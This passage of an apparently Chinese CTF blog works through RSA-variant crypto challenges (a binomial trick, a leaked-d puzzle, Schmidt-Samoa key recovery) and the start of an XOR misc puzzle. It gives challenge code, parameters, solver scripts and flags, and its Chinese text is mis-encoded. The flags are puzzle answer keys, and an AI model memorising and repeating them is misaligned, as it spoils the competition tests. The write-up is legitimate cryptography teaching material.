class="hljs-number">256</span><br>    bits = <span class="hljs-number">777</span><br>    oder = <span class="hljs-number">4</span><br>    a = randint(<span class="hljs-number">1</span> &lt;&lt; bits, <span class="hljs-number">1</span> &lt;&lt; bits + <span class="hljs-number">1</span>)   <span class="hljs-comment">#aæ˜¯777ä½éšæœºæ•°</span><br>    p=getPrime(BITS)      <span class="hljs-comment">#pæ˜¯256ä½ç´ æ•°</span><br>    p1 = p**oder+a        <span class="hljs-comment">#p1=p*4+a</span><br>    <span class="hljs-keyword">return</span> p,p1<br>p,p1=get_p()<br>s=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br>n=p*q**<span class="hljs-number">4</span><br>e=<span class="hljs-number">65537</span><br>c1=<span class="hljs-built_in">pow</span>(s,e,n)     <span class="hljs-comment">#æ±‚s</span><br><span class="hljs-comment">#d=invert(e,(p-1)(q**4-q**3))</span><br><span class="hljs-comment">#s=pow(c1,d,n)</span><br>c=<span class="hljs-built_in">pow</span>(s**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>,m1,s**<span class="hljs-number">5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1=&quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p1 =&quot;</span>,p1)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327</span><br><span class="hljs-string">c = 8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436</span><br><span class="hljs-string">n = 1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111</span><br><span class="hljs-string">p1 = 145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br></code></pre></td></tr></table></figure><p><strong>è§£ç­”</strong></p><p>p,qå®¹æ˜“å¾—åˆ°ï¼Œä¹‹åæŒ‰æ­£å¸¸çš„RSAæ­¥éª¤æ±‚å‡ºsï¼Œä¹‹åå°±æ˜¯åˆ©ç”¨sæ±‚m</p><p>$\because c&#x3D;pow(s^3+1,m,s^5)$</p><p>$å³c&#x3D;(s^3+1)^mmods^5$</p><p>ç”±äºŒé¡¹å¼å®šç†å¾—ï¼š</p><p>$(s^3+1)^m&#x3D;C_m^0s^{3m}1^0+C_m^1s^{3(m-1)}1^1â€¦+C_m^{m-1}s^31^{m-1}+C_m^ms^01^m$</p><p>$\therefore (s^3+1)^m&#x3D;C_m^0s^{3m}+C_m^1s^{3(m-1)}â€¦+C_m^{m-1}s^3+C_m^ms^0$</p><p>å› ä¸ºmå¿…å®šå¤§äº2</p><p>$\therefore s^3$å‰é¢çš„æ•°å¿…å®šæ˜¯s^5çš„å€æ•°ï¼Œå¯ä»¥ç›´æ¥çº¦æ‰</p><p>$\therefore (s^3+1)^m&#x3D;ms^3+1mods^5$</p><p>$\therefore c&#x3D;ms^3+1mods^5$</p><p>$\because ç”±äºflagçš„é•¿åº¦å¯çŸ¥m&lt;s^2(2048bits)$</p><p>$\therefore c&#x3D;ms^3+1$</p><p>$\therefore m&#x3D;(c-1)&#x2F;(s^3)$</p><p><strong>ä»£ç å®ç°å¦‚ä¸‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br>c1= <span class="hljs-number">671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327</span><br>c = <span class="hljs-number">8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436</span><br>n = <span class="hljs-number">1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111</span><br>p1 = <span class="hljs-number">145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553</span><br>e = <span class="hljs-number">65537</span><br><br>p_tmp=gmpy2.iroot(p1,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-comment">#æš´åŠ›ç ´è§£på’Œq</span><br>    q_tmp=n // p_tmp<br>    <span class="hljs-keyword">if</span> n==q_tmp*p_tmp:<br>        p=p_tmp<br>        q=gmpy2.iroot(q_tmp,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">break</span><br>    p_tmp-=<span class="hljs-number">1</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q**<span class="hljs-number">4</span>-q**<span class="hljs-number">3</span>)   <span class="hljs-comment">#æ¬§æ‹‰å‡½æ•°</span><br>d=gmpy2.invert(e,phi)<br>s=<span class="hljs-built_in">pow</span>(c1,d,n)<br><span class="hljs-comment">#print(s)</span><br>m=(c-<span class="hljs-number">1</span>)//(s**<span class="hljs-number">3</span>)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span>&#x27;ISCTF&#123;<span class="hljs-number">8</span>e0ff2de-cd65-<span class="hljs-number">497</span>f-a755-<span class="hljs-number">815154</span>bb5b1f&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="äº”ã€è“é²¨çš„è´¹é©¬"><a href="#äº”ã€è“é²¨çš„è´¹é©¬" class="headerlink" title="äº”ã€è“é²¨çš„è´¹é©¬"></a>äº”ã€è“é²¨çš„è´¹é©¬</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;ISCTF&#123;********&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>p=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>q=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>n=p*q<br>e=<span class="hljs-number">0x10001</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>leak = (d+(<span class="hljs-built_in">pow</span>(p,q,n)+<span class="hljs-built_in">pow</span>(q,p,n)))%n<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>, c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak=&quot;</span>, leak)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c= 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997</span><br><span class="hljs-string">n= 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247</span><br><span class="hljs-string">leak= 9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>$\because å·²çŸ¥leak&#x3D;(d+p^qmodn+q^pmodn)modn$</p><p>$ä»¤x&#x3D;p^qmodn,åˆ™æœ‰x&#x3D;p^q+kn,å³x&#x3D;p^q+k(p*q)$</p><p>$\therefore xmodq&#x3D;(p^q+k(p*q)modq&#x3D;p^qmodq$</p><p>$\therefore x*p^{-1}&#x3D;p^{q-1}modq$</p><p>$\because qæ˜¯ç´ æ•°$</p><p>$\therefore ç”±è´¹é©¬å°å®šç†å¾—p^{q-1}&#x3D;x*p^{-1}&#x3D;1modq$</p><p>$\therefore x&#x3D;pmodq,å³p^qmodn&#x3D;pmodp$</p><p>$åŒç†ï¼Œå¾—q^pmodn&#x3D;q$</p><p>$\therefore d&#x3D;leak-(pmodq+qmodp)modn$</p><p>$\because næ˜¯2047bitï¼Œleakæ˜¯2043bitï¼Œp+qåœ¨1024bitå·¦å³$</p><p>$\therefore dæœ€æœ‰å¯èƒ½ç›´æ¥ç­‰äºleak-(p+q)$</p><p>$\because p+q&#x3D;n+1-(p-1)(q-1)$</p><p>ä¸”dæ˜¯eå…³äºmod(p-1)(q-1)çš„é€†</p><p>$\therefore d&#x3D;leak-n-1$</p><p>ä¹‹åç›´æ¥ç®€å•çš„RSAè§£å¯†å°±è¡Œ</p><p><strong>ä»£ç å¦‚ä¸‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>c= <span class="hljs-number">8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997</span><br>n= <span class="hljs-number">13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247</span><br>leak= <span class="hljs-number">9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881</span><br>e=<span class="hljs-number">0x10001</span><br><br>d=leak-n-<span class="hljs-number">1</span><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flag:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;ISCTF&#123;u_got_it&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="å…­ã€Schmidt-Samoaï¼ˆRSAï¼‰"><a href="#å…­ã€Schmidt-Samoaï¼ˆRSAï¼‰" class="headerlink" title="å…­ã€Schmidt-Samoaï¼ˆRSAï¼‰"></a>å…­ã€Schmidt-Samoaï¼ˆRSAï¼‰</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><br>flag = <span class="hljs-string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">p, q</span>):<br>    public_key = p*p*q        <br>    e = public_key        <br>    n = p*q<br>    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    private_key = inverse(e,phi_n)<br>    <span class="hljs-keyword">return</span> public_key,private_key,e<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>N,d,e = gen_key(p,q)<br><br>c = gmpy2.powmod(bytes_to_long(flag),e,N)<br><br><span class="hljs-built_in">print</span>(N)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br><span class="hljs-string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br><span class="hljs-string">c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>ï¼ˆæœ¬é¢˜è€ƒæŸ¥Schmidt-Samoaå¯†ç ç³»ç»Ÿï¼‰</p><p>åˆ†æé¢˜ç›®ï¼Œå¯ä»¥çŸ¥é“ï¼Œæœ¬é¢˜çš„å…³é”®åœ¨äºæ±‚å‡º$p\times q$ã€‚</p><p>è®¾aä¸ºä¸€ä¸ªè¾ƒå°çš„æ­£æ•´æ•°ï¼Œåˆ™$a^{N \times d}\equiv a^{k \times (p-1)(q-1)}\equiv amodp\times q$</p><p>$\therefore a^{N\times d}-a\equiv 0modp\times q$</p><p>$\therefore a^{N\times d}-a&#x3D;k\times p\times q$</p><p>$\because N&#x3D;p \times p\times q$</p><p>$\therefore p\times q&#x3D;gcd(a^{N\times d}-a,N)$,ä¸ºäº†æ–¹ä¾¿å°†å–a&#x3D;2</p><p>æ¥ç€è¿›è¡Œç®€å•çš„RSAè§£å¯†å°±è¡Œ</p><p><strong>ä»£ç å¦‚ä¸‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>n = <span class="hljs-number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br>d = <span class="hljs-number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br>c = <span class="hljs-number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span><br><br>pq=gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,n*d,n)-<span class="hljs-number">2</span>,n)<br>m=<span class="hljs-built_in">pow</span>(c,d,pq)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flagï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;D0g3xGC&#123;W1sh_Y0u_Go0d_L@ucK-111&#125;&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Misc-é¢˜ç›®å¤ç°</title>
    <link href="/2024/10/30/Misc-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/30/Misc-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ä¸€ã€æ´¾æ£®"><a href="#ä¸€ã€æ´¾æ£®" class="headerlink" title="ä¸€ã€æ´¾æ£®"></a>ä¸€ã€æ´¾æ£®</h2><p><strong>é¢˜ç›®</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">è…ä¹³æ˜‚æœ¨ å¥¥æ™®ç‘ç‰¹å„¿ é˜´å¡å°”ç‰¹ è‰¾å…‹æ–¯å¥¥å°”<br>è…ä¹³æ˜‚æœ¨ æå…‹æœ‰ç¬¬çˆ±æ…• é˜´å¡å°”ç‰¹ â­<br>å¼—æ‹‰æ ¼ ç­‰äº å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰å¸ƒæ‹‰<br>å°åˆ» ç­‰äº å·¦ä¸­æ‹¬å·å³ä¸­æ‹¬å·<br>ä½›å„¿ å”‰ å›  æ¢¯è½¯è€…å·¦æ‹¬å· é›¶ï¼Œæ¥å·¦æ‹¬å·å¼—æ‹‰æ ¼å³æ‹¬å·ï¼Œå››å³æ‹¬å·å†’å·<br>    å°åˆ»ã€‚é¹…æ½˜å¾·ï¼ˆè‰¾å…‹æ–¯å¥¥å°”ï¼ˆå¥¥å°”å¾·ï¼ˆå¼—æ‹‰æ ¼ã€å”‰ã€‘ï¼‰ï¼Œå¥¥å°”å¾·ï¼ˆå¼—æ‹‰æ ¼ã€å”‰åŠ äºŒã€‘ï¼‰ï¼‰ï¼‰<br>    å°åˆ»ã€‚é¹…æ½˜å¾·ï¼ˆè‰¾å…‹æ–¯å¥¥å°”ï¼ˆå¥¥å°”å¾·ï¼ˆå¼—æ‹‰æ ¼ã€å”‰åŠ ä¸€ã€‘ï¼‰ï¼Œå¥¥å°”å¾·ï¼ˆå¼—æ‹‰æ ¼ã€å”‰åŠ ä¸‰ã€‘ï¼‰ï¼‰ï¼‰<br>    å°åˆ»ã€‚é¹…æ½˜å¾·ï¼ˆå¥¥å°”å¾·ï¼ˆå¼—æ‹‰æ ¼ã€å”‰åŠ äºŒã€‘ï¼‰ï¼‰<br>    å°åˆ»ã€‚é¹…æ½˜å¾·ï¼ˆå¥¥å°”å¾·ï¼ˆå¼—æ‹‰æ ¼ã€å”‰åŠ ä¸‰ã€‘ï¼‰ï¼‰<br>æ™®ç‘å› æ©ç‰¹å·¦æ‹¬å·å°åˆ»å³æ‹¬å·<br>äº•å·[<span class="hljs-number">16</span>, <span class="hljs-number">29</span>, <span class="hljs-number">67</span>, <span class="hljs-number">84</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">48</span>, <span class="hljs-number">30</span>, <span class="hljs-number">111</span>, <span class="hljs-number">107</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">52</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">110</span>, <span class="hljs-number">51</span>, <span class="hljs-number">44</span>, <span class="hljs-number">69</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">74</span>, <span class="hljs-number">45</span>, <span class="hljs-number">121</span>, <span class="hljs-number">95</span>, <span class="hljs-number">70</span>, <span class="hljs-number">84</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">113</span>, <span class="hljs-number">125</span>]<br></code></pre></td></tr></table></figure><p>å¾ˆæœ‰æ„æ€ï¼Œæ˜¯ä¸€ä¸ªéŸ³è¯‘åçš„pythonä»£ç ï¼Œå¤§æ¦‚ç¿»è¯‘è¿‡æ¥ï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> xor<br><span class="hljs-keyword">from</span> æå…‹æœ‰ç¬¬çˆ±æ…• <span class="hljs-keyword">import</span> *<br>flag = &#123;********************&#125;<br>ans = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>ï¼Œ<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">4</span>):<br>    ans.append(xor(<span class="hljs-built_in">ord</span>(flag[i])ï¼Œ<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">2</span>])))<br>    ans.append(xor(<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">1</span>])ï¼Œ<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">3</span>])))<br>    ans.append(<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">2</span>]))<br>    ans.append(<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">3</span>]))<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#[16, 29, 67, 84, 31, 75, 89, 48, 30, 111, 107, 48, 49, 52, 95, 67, 6, 2, 110, 51, 44, 69, 95, 118, 74, 45, 121, 95, 70, 84, 49, 49, 0, 0, 33, 33, 0, 10, 113, 125]</span><br></code></pre></td></tr></table></figure><p>æ²¡çŒœåˆ°â€æå…‹æœ‰ç¬¬çˆ±â€å¯¹åº”çš„ä»£ç ï¼Œä½†å¹¶ä¸å½±å“åšé¢˜ï¼Œåªæ˜¯ç®€å•çš„å¼‚æˆ–ã€‚</p><p>ç”±äº<strong>å¼‚æˆ–</strong>è¿ç»­è¿›è¡Œä¸¤æ¬¡åä¼šå¾—åˆ°åŸæ•°æ®ï¼Œå› 